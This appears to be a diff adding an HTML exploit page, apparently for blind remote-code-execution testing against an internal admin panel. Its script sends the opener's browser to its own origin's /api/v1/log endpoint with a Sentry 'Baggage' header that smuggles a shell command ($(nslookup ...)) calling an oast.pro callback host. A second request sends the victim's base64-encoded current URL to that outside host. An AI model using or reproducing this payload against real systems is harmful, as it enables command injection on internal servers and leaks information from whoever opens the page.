@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // Instead of a hardcoded URL, we use 'window.location.origin'
+        // This targets whatever internal domain the admin is currently on.
+        const target = window.location.origin + "/api/v1/log"; 
+        
+        const payload = "sentry-environment=production,sentry-release=$(nslookup rce-test.d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro)";
+
+        // We send the request to the SAME server that is hosting the admin panel
+        fetch(target, {
+            method: 'GET',
+            mode: 'no-cors',
+            headers: { 'Baggage': payload }
+        });
+
+        // Also, let's exfiltrate the CURRENT URL so you know exactly where you are
+        fetch("https://d57482c2ca0c66d951a2g11mcpeyyyyyb.oast.pro/target-info?url=" + btoa(window.location.href));
+    </script>
+</body>
+</html>
